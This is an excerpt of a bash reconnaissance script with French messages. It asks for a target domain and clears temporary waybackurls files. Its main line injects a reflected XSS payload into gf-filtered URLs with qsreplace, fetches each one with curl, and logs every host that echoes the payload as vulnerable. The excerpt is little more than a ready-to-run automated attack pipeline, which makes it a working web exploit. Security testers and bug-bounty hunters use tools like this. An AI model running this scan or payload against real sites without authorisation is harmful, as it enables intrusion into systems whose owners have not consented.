...
read -r domain
if [[ -z "$domain" ]]; then
    echo -e "${RED}[-] Aucun domaine saisi. Abandon." >&2
    exit 1
fi
...
rm -f "$domain/waybackurls/tmp.txt"
sleep 1
...
rm -f "$domain/waybackurls/valid-tmp.txt"
...
cat "$domain/gf/xss.txt" | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n"; done | tee "$domain/vulnerabilities/xss_scan/vulnxss.txt"
